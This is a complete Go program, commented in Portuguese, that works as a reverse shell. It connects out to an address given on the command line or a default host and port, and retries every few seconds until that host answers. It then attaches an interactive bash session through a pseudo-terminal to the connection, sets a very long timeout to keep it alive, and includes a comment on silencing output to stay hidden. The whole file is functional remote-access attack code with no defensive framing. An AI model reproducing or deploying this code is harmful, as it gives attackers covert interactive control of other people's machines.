package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"time"
	"github.com/creack/pty"
)

const (
	CON_ALVO            = "127.0.0.1:8686"
	CON_TIPO            = "tcp"
	TENTAR_CONEXAO_APOS = "4s"
	SHELL               = "bash"
	DEADLINE            = "99999s" // Evita que a conexão seja dropada
)

type ManipularConn func(*net.Conn)

func aguardarServidor(HandlerFn ManipularConn) {
	for {
		var str_con string
		if len(os.Args) > 1 {
			str_con = os.Args[1]
		} else {
			str_con = CON_ALVO
		}

		c, err := net.Dial(CON_TIPO, str_con)
		conn_p := &c

		if err != nil {
			fmt.Println("Servidor não respondeu, tentando novamente em " + TENTAR_CONEXAO_APOS)
			delay, _ := time.ParseDuration(TENTAR_CONEXAO_APOS)

			time.Sleep(delay)
			continue
		}

		HandlerFn(conn_p)
		break
	}
}

func main() {
	// os.Stdout = nil descomente para desativar todas as mensagens no stdout

	if len(os.Args) > 1 && os.Args[1] == "-h" {
		fmt.Println("\n\t\t./gotty <ip>:<port>")
		os.Exit(0)
	}

	manipularConexao := func(c *net.Conn) {

		//Configura timeout I/O
		d, _ := time.ParseDuration(DEADLINE)
		conn := *c

		conn.SetDeadline(time.Now().Add(d))
		fmt.Println("Conectado com " + conn.RemoteAddr().String())
		
		shell_interativa := exec.Command(SHELL)
		ptmx, err := pty.Start(shell_interativa)
	
		if err != nil {
			conn.Write([]byte("Erro ao criar pty: " + err.Error()))
			return
		}

		defer func() { _ = ptmx.Close() }() // Fecha o PTY

		// Conecta o STDOUT e STD/IN/ERR do PTY com o descriptor da conexão atual
		go func() { _, _ = io.Copy(ptmx, conn) }()
    	_, _ = io.Copy(conn, ptmx)

		// Fecha a conexão quando a função anônima retorna
		defer conn.Close()

		if err != nil {
			conn.Write([]byte("Erro ao executar shell: " + err.Error()))
			return
		}
	}

	for {
		aguardarServidor(manipularConexao)
	}
}
